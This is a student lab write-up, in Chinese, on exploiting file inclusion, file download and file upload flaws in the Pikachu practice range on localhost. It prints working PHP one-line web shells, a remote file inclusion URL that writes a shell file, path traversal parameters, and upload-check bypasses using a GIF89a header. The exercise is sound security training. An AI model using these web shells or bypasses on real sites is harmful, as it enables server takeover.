# 实验2

## 一、文件包含

由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞

### 1.本地文件包含

查看靶场的URL，猜测此时的file.php一共有五个，我们可以尝试修改`filename=file6.php`

![1718516905589](./1718516905589.png)

![1718517307200](./1718517307200.png)

也可以随机输入一个参数，查看报错。根据报错判断其源文件所在位置，因此可以构造参数 `../../../../flag.txt`

![1718517906185](./1718517906185.png)

![1718518024708](./1718518024708.png)

### 2.远程文件包含

能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码。同时根据提示，我们查阅了include()函数的用法：include语句用于在执行流中插入写在其他文件中的有用的代码。

因此我们为了引入一句话木马，在某一个链接指向的文件中设置一个恶意脚本，可以在网站目录下创建包含一句话木马的恶意文件，代码如下

```
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[hack]);?>');?>
```

为了方便起见，我们将其放置在phpstudy的根目录下，使用tomcat服务器即可访问。

基于此我们可以构造一个URL：`http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/hack.txt&submit=提交`执行后，如果开启上帝视角，查看网站目录，可以看出其存在一个shell.php文件，内容为：

```php
<?php @eval($_POST[hack]);?>
```

![1718519973474](./1718519973474.png)

我们启动蚁剑对其进行链接，成功连接

![1718520308169](./1718520308169.jpg)

![1718520457737](./1718520457737.png)

## 二、文件下载漏洞

点击图片进行下载，使用BP抓包后不放，就可以看见下载的URL

```
http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png
```

![1718520845087](./1718520845087.png)

对其进行修改，修改为`filename=../../../../flag.txt`，放包，发现下载了根目录的文件

![1718521012502](./1718521012502.jpg)

## 三、文件上传漏洞

### 1.前端检查

阅读源码，如果发现类似于这种在前端通过后缀名判断文件类型的，可以通过BP抓包来修改。如我们编写一个一句话木马。将其后缀名修改为`jpg`，绕过前端检查后，通过BP抓包来修改后缀并使用蚁剑连接即可

```
<?php @eval($_POST[hack]);?>
```

![1718617998062](./1718617998062.png)

![1718618333836](./1718618333836.png)

![1718618365532](./1718618365532.png)

### 2.后端检查MIME

对于后端检查MIME，也就是BP抓包中的`content_type`，我们只需要按照他的过滤状态来绕过检查，实际上并没有检查内容

![1718618672059](./1718618672059.png)

![1718618716255](./1718618716255.png)

### 3.getmagesize函数

getmagesize可以获取图片的宽高的信息，如果上传到不是图片文件，那么该函数就获取不到信息，就不允许上传，因此我们可以制作图片木马或再木马文件内容头部添加`GIF89a`(Gif图片文件头), 然后利用文件包含漏洞来解析图片木马

```php
GIF89a <?php @eval($_POST[hack]);?>
```

可以看出，上传后的路径`uploads/2024/06/17/86291666702aeb7178e299664289.jpg`，这时可以利用蚁剑连接。

![1718627204895](./1718627204895.png)